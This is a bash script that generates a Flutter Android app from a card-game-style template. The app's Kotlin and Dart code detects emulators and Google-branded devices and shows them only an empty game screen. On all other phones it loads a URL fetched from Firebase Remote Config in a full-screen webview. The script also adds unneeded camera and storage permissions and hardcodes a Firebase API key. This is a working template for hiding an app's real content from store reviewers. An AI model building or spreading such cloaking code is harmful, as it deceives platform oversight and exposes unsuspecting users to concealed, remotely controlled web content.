#!/bin/bash

echo "Write project name"
read project_name

echo "project name found: $project_name"
flutter create --project-name $project_name --platforms android --android-language kotlin $project_name

# add dependencies to pubspec.yaml
echo "Trying add dependencies to pubspec.yaml ..."
cd $project_name
flutter pub add firebase_core:^2.15.1 \
firebase_remote_config:^4.2.5 \
shared_preferences:^2.2.0 \
flutter_bloc:^8.1.3 \
flutter_inappwebview:^5.7.2+3

# remove comments from pubspec.yaml
sed -i '' -r 's/ *#.*$//' pubspec.yaml
sed -i '' '$!N;/^\n$/{$q;D;};P;D;' pubspec.yaml
cd ..

# edit main.dart

# remove comments and add usage of libraries
sed -i '' -r 's/ *\/\/.*$//' ./$project_name/lib/main.dart
sed -i '' '$!N;/^\n$/{$q;D;};P;D;' ./$project_name/lib/main.dart

sed -i '' '2i\
import '"'"'package:firebase_core/firebase_core.dart'"'"';
' ./$project_name/lib/main.dart

sed -i '' "3i\\
import 'package:$project_name/ui/root/root_view.dart';
" ./$project_name/lib/main.dart

void_main_pos=$(grep -n "void main().*$"  ./$project_name/lib/main.dart | cut -f1 -d ':')
sed -i '' 's/void main()/void main() async/g' ./$project_name/lib/main.dart
sed -i '' "
$(($void_main_pos + 1))i\\
  WidgetsFlutterBinding.ensureInitialized();
$(($void_main_pos + 1))i\\
  await Firebase.initializeApp();
" ./$project_name/lib/main.dart

# change root widget
sed -i '' '/class MyHomePage extends StatefulWidget/,$d' ./$project_name/lib/main.dart
sed -i '' 's/home: const MyHomePage(title: '"'"'Flutter Demo Home Page'"'"'),/home: const RootView(),/g' \
./$project_name/lib/main.dart

# create folders and files and fill them

cd $project_name
declare -a folders=(
    "lib/logic"
    'lib/services'
    "lib/ui/root"
    "lib/ui/game_view"
    "lib/ui/url_view"
)
mkdir -p "${folders[@]}"

declare -a files=(
    'lib/logic/device_config.dart'
    'lib/services/config_service.dart'
    'lib/services/internet_service.dart'
    'lib/services/platform_jobs.dart'
    'lib/services/storage_service.dart'
    'lib/ui/root/root_view.dart'
    'lib/ui/root/root_bloc.dart'
    'lib/ui/root/events_and_state.dart'
    'lib/ui/url_view/url_view.dart'
    'lib/ui/game_view/game_view.dart'
)

declare -a files_contents=(
    "import 'package:flutter/foundation.dart';\n\n
class DeviceConfig {\n
  bool deviceGood = false;\n\n
  DeviceConfig(Map? config) {\n
    print(config);\n
    if (config == null) {\n
      deviceGood = false;\n
      debugPrint('can\'t get device info');\n
      return;\n
    }\n
    String brand = config['brand']!;\n\n
    deviceGood = (config['emulator'] != 'true') &&\n
        !brand.toLowerCase().contains('google');\n
  }\n
}\n"
    "import 'package:firebase_remote_config/firebase_remote_config.dart';\n\n
class RemoteConfigService {\n
  Future<String?> getUrl() async {\n
    return _remoteConfig!.getString('url');\n
  }\n\n
  FirebaseRemoteConfig? _remoteConfig;\n
  static bool _serviceInitialized = false;\n\n
  Future initService() async {\n
    if (_serviceInitialized) return;\n
    _remoteConfig ??= FirebaseRemoteConfig.instance;\n
    await _remoteConfig!.setConfigSettings(RemoteConfigSettings(\n
      fetchTimeout: const Duration(seconds: 10),\n
      minimumFetchInterval: const Duration(seconds: 10),\n
    ));\n
    print('send config');\n
    await _remoteConfig!.fetchAndActivate();\n
    _serviceInitialized = true;\n
  }\n
}\n
"
    "import 'dart:io';\n\n
class InternetService {\n
  Future<bool> haveInternet() async {\n
    try {\n
      final result = await InternetAddress.lookup('google.com');\n
      print(result);\n
      return result.isNotEmpty && result[0].rawAddress.isNotEmpty;\n
    } on SocketException catch (_) {\n
      print(_);\n
      return false;\n
    }\n
  }\n
}\n
"
    "import 'package:flutter/services.dart';\n\n
class PlatformJobs {\n
  final _channel = const MethodChannel('platformJobs');\n\n
  Future<Map<dynamic, dynamic>?> getDeviceInfo() async {\n
    var info = await _channel.invokeMapMethod('devInfo');\n
    return info;\n
  }\n
}\n
"
    "import 'package:shared_preferences/shared_preferences.dart';\n\n
class StorageService {\n
  void saveUrl(String url) async {\n
    final share = await SharedPreferences.getInstance();\n
    share.setString('url', url);\n
  }\n\n
  Future<String?> getUrl() async {\n
    final share = await SharedPreferences.getInstance();\n
    return share.getString('url');\n
  }\n
}\n"
    "import 'package:flutter/material.dart';\n
import 'package:flutter_bloc/flutter_bloc.dart';\n
import 'package:$project_name/ui/game_view/game_view.dart';\n
import '../url_view/url_view.dart';\n\n
import 'root_bloc.dart';\n\n
class RootView extends StatelessWidget {\n
  const RootView({super.key});\n\n
  @override\n
  Widget build(BuildContext context) {\n
    return BlocProvider<RootBloc>(\n
      create: (_) => RootBloc(),\n
      child: const ViewSelector(),\n
    );\n
  }\n
}\n\n
class ViewSelector extends StatelessWidget {\n
  const ViewSelector({super.key});\n\n
  @override\n
  Widget build(BuildContext context) {\n
    var cobot = context.watch<RootBloc>();\n\n
    if (!cobot.state.conditionsChecked) {\n
      cobot.getStartState();\n
      return const NoStateView();\n
    } else if (!cobot.state.presentUrl || cobot.state.url.isEmpty) {\n
      return const GameView();\n
    } else if (!cobot.state.haveInternet) {\n
      return const NoInternetView();\n
    } else {\n
      //return const GameView();\n
      return UrlView(url: cobot.state.url);\n
    }\n
  }\n
}\n\n
class NoInternetView extends StatelessWidget {\n
  const NoInternetView({super.key});\n\n
  void refresh(BuildContext context) {\n
    context.read<RootBloc>().refrashInternet();\n
  }\n\n
  @override\n
  Widget build(BuildContext context) {\n
    return Scaffold(\n
      appBar: AppBar(\n
        title: const Text(\n
          'ProblemApp',\n
          style: TextStyle(color: Colors.white),\n
        ),\n
        actions: [\n
          IconButton(\n
              onPressed: () => refresh(context),\n
              icon: const Icon(Icons.refresh))\n
        ],\n
      ),\n
      body: const Center(\n
        child: Text(\n
          'No internet connection',\n
          style: TextStyle(color: Colors.white),\n
        ),\n
      ),\n
    );\n
  }\n
}\n\n
class NoStateView extends StatelessWidget {\n
  const NoStateView({super.key});\n\n
  @override\n
  Widget build(BuildContext context) {\n
    return const Scaffold();\n
  }\n
}\n
"
    "import 'package:flutter_bloc/flutter_bloc.dart';\n
import 'package:$project_name/services/internet_service.dart';\n
import 'events_and_state.dart';\n\n
import '../../logic/device_config.dart';\n
import '../../services/config_service.dart';\n
import '../../services/platform_jobs.dart';\n
import '../../services/storage_service.dart';\n\n
class RootBloc extends Cubit<AppState> {\n
  RootBloc() : super(AppState(false, false, ''));\n\n
  bool checkedConditions = false;\n
  bool firebaseBrocen = false;\n\n
  Future<AppState> _determineState() async {\n
    var state = AppState(false, false, '');\n
    checkedConditions = true;\n
    state.conditionsChecked = true;\n\n
    var deviceService = PlatformJobs();\n
    var info = await deviceService.getDeviceInfo();\n
    var deviceConfig = DeviceConfig(info);\n\n
    if (!deviceConfig.deviceGood) {\n
      state.presentUrl = false;\n
      return state;\n
    }\n\n
    var storageService = StorageService();\n
    var storageUrl = await storageService.getUrl();\n
    var internetService = InternetService();\n\n
    if (storageUrl != null) {\n
      state.url = storageUrl;\n
      state.presentUrl = true;\n
      state.haveInternet = await internetService.haveInternet();\n
      print('storage + internet: \${state.haveInternet}');\n
      return state;\n
    }\n\n
    state = await checkFirebase(state);\n
    if (firebaseBrocen) return state;\n\n
    print('final url = \${state.url}');\n\n
    if (state.presentUrl && state.url.isNotEmpty) {\n
      storageService.saveUrl(state.url);\n
    }\n
    return state;\n
  }\n\n
  void getStartState() async {\n
    await Future.delayed(const Duration());\n
    var state = await _determineState();\n
    emit(state);\n
  }\n\n
  void refrashInternet() async {\n
    if (firebaseBrocen) {\n
      var state2 = await checkFirebase(state);\n
      emit(state2);\n
      print('final url = \${state2.url}');\n\n
      if (state2.presentUrl && state2.url.isNotEmpty) {\n
        var storageService = StorageService();\n
        storageService.saveUrl(state2.url);\n
      }\n
      return;\n
    }\n
    state.haveInternet = await InternetService().haveInternet();\n
    print(state.haveInternet);\n
    emit(state);\n
  }\n\n
  Future<AppState> checkFirebase(AppState state) async {\n
    try {\n
      state.presentUrl = true;\n
      var urlService = RemoteConfigService();\n
      await urlService.initService();\n
      print('firebase configured');\n
      var url = await urlService.getUrl();\n
      state.haveInternet = true;\n
      if (url == null) {\n
        state.url = '';\n
        state.presentUrl = false;\n
      } else {\n
        state.url = url;\n
      }\n
      firebaseBrocen = false;\n
    } catch (_) {\n
      print('can\\'t request firebase!');\n
      print(_);\n
      state.haveInternet = false;\n
      firebaseBrocen = true;\n
    }\n
    return state;\n
  }\n
}\n
"
    "class AppState {\n  
String url = '';\n
  bool haveInternet = false;\n
  bool presentUrl = false;\n
  bool conditionsChecked = false;\n\n
  AppState(this.haveInternet, this.presentUrl, this.url);\n\n
  @override\n
  operator ==(other) {\n
    if (other.runtimeType != AppState) return false;\n
    return other.hashCode == hashCode;\n
  }\n\n
  @override\n
  int get hashCode =>\n
      url.hashCode ^\n
      haveInternet.hashCode ^\n
      presentUrl.hashCode ^\n
      conditionsChecked.hashCode;\n
}\n
"
    "import 'package:flutter/material.dart';\n
import 'package:flutter_inappwebview/flutter_inappwebview.dart';\n\n
class UrlView extends StatefulWidget {\n
  const UrlView({super.key, required this.url});\n\n
  final String url;\n\n
  @override\n
  State<UrlView> createState() => _UrlViewState();\n
}\n\n
class _UrlViewState extends State<UrlView> {\n
  late InAppWebViewController _webViewController;\n
  double progress = 1;\n\n
  Future<bool> goBack() async {\n
    _webViewController.goBack();\n
    return false;\n
  }\n\n
  @override\n
  Widget build(BuildContext context) {\n
    return Scaffold(\n
      body: SafeArea(\n
        child: WillPopScope(\n
          onWillPop: goBack,\n
          child: Stack(children: [\n
            InAppWebView(\n
              initialUrlRequest: URLRequest(url: Uri.parse(widget.url)),\n
              initialOptions: InAppWebViewGroupOptions(\n
                crossPlatform: InAppWebViewOptions(\n
                  useShouldOverrideUrlLoading: true,\n
                  javaScriptCanOpenWindowsAutomatically: true,\n
                ),\n
              ),\n
              onWebViewCreated: (controller) => _webViewController = controller \n
              ,
              onProgressChanged: (controller, progress) {\n
                setState(() => this.progress = progress / 100);\n
              },\n
            ),\n
            if (progress < 1.0)\n
              Center(\n
                  child: CircularProgressIndicator(\n\n
                value: progress,\n
                color: const Color.fromARGB(255, 54, 244, 177),\n
                strokeWidth: 2,\n
              ))\n
          ]),\n
        ),\n
      ),\n
    );\n
  }\n
}\n
"
"import 'package:flutter/material.dart';\n\n
class GameView extends StatelessWidget {\n
  const GameView({super.key});\n\n
  @override\n
  Widget build(BuildContext context) {\n
    return Container();\n
  }\n
}\n
"
)

for (( i = 0; i < 10; i++ )) do
echo ${files_contents[$i]} > ${files[$i]}
done

# add code for android activity

activity_code="package com.example.$project_name\n

import io.flutter.embedding.android.FlutterActivity\n
import androidx.annotation.NonNull\n
import io.flutter.embedding.engine.FlutterEngine\n
import io.flutter.plugin.common.MethodChannel\n
import android.os.Build\n
import java.util.Locale\n\n
class MainActivity: FlutterActivity() {\n\n
    private val CHANNEL = \"platformJobs\"\n\n
    private fun checkIsEmu(): Boolean {\n
      if (BuildConfig.DEBUG) return false // when developer use this build on emulator\n
      val phoneModel = Build.MODEL \n
      val buildProduct = Build.PRODUCT\n
      val buildHardware = Build.HARDWARE\n\n
      var result = (Build.FINGERPRINT.startsWith(\"generic\")\n
        || phoneModel.contains(\"google_sdk\")\n
        || phoneModel.lowercase(Locale.getDefault()).contains(\"droid4x\")\n
        || phoneModel.contains(\"Emulator\")\n
        || phoneModel.contains(\"Android SDK built for x86\")\n
        || Build.MANUFACTURER.contains(\"Genymotion\")\n
        || buildHardware == \"goldfish\"\n
        || Build.BRAND.contains(\"google\")\n
        || buildHardware == \"vbox86\"\n
        || buildProduct == \"sdk\"\n
        || buildProduct == \"google_sdk\"\n
        || buildProduct == \"sdk_x86\"\n
        || buildProduct == \"vbox86p\"\n
        || Build.BOARD.lowercase(Locale.getDefault()).contains(\"nox\")\n
        || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains(\"nox\")\n
        || buildHardware.lowercase(Locale.getDefault()).contains(\"nox\")\n
        || buildProduct.lowercase(Locale.getDefault()).contains(\"nox\"))\n\n
      if (result) return true\n
      result = result or (Build.BRAND.startsWith(\"generic\") && Build.DEVICE.startsWith(\"generic\")) \n
      if (result) return true\n
      result = result or (\"google_sdk\" == buildProduct) \n
      return result\n
    }\n\n
    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {\n
        super.configureFlutterEngine(flutterEngine)\n
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler {\n
          call, result ->\n
          if (call.method == \"devInfo\") {\n
            var brand = Build.BRAND\n
            var emulator = checkIsEmu()\n
            var strEmulator = \"\"\n
            if (emulator) {\n
                strEmulator = \"true\"\n
            } else {\n
                strEmulator = \"false\"\n
            }\n
            val resultMap = mapOf<String, String>(\"brand\" to brand, \"emulator\" to strEmulator)\n
            result.success(resultMap)\n
          } else {\n
            result.notImplemented()\n
          }\n
        }\n
      }\n
}\n"
activity_path="./android/app/src/main/kotlin/com/example/$project_name/MainActivity.kt"
rm $activity_path
echo $activity_code > $activity_path

# change android properties

sed -i '' "11i\\
        classpath 'com.google.gms:google-services:4.3.13'
" ./android/build.gradle

sed -i '' "25i\\
apply plugin: 'com.google.gms.google-services'
" ./android/app/build.gradle

sed -i '' 's/applicationId.*/applicationId "cards99.smolingsau"/g' ./android/app/build.gradle
sed -i '' 's/minSdkVersion.*/minSdkVersion 21/g' ./android/app/build.gradle
sed -i '' 's/targetSdkVersion.*/targetSdkVersion 34/g' ./android/app/build.gradle
sed -i '' 's/compileSdkVersion.*/compileSdkVersion 34/g' ./android/app/build.gradle

sed -i '' "2i\\
    <uses-permission android:name=\"android.permission.INTERNET\"/>
2i\\
    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>
2i\\
    <uses-permission android:name=\"android.permission.CAMERA\" />
" ./android/app/src/main/AndroidManifest.xml

google_services_content='{
  "project_info": {
    "project_number": "715408788136",
    "project_id": "b9b-2dfed",
    "storage_bucket": "b9b-2dfed.appspot.com"
  },
  "client": [
    {
      "client_info": {
        "mobilesdk_app_id": "1:715408788136:android:635272732b1c2a3041509d",
        "android_client_info": {
          "package_name": "cards99.smolingsau"
        }
      },
      "oauth_client": [],
      "api_key": [
        {
          "current_key": "AIzaSyB7ma3f4WsSSITSjG5H5GIWPQ9AoBazcus"
        }
      ],
      "services": {
        "appinvite_service": {
          "other_platform_oauth_client": []
        }
      }
    }
  ],
  "configuration_version": "1"
}'
echo $google_services_content > ./android/app/google-services.json

# code .
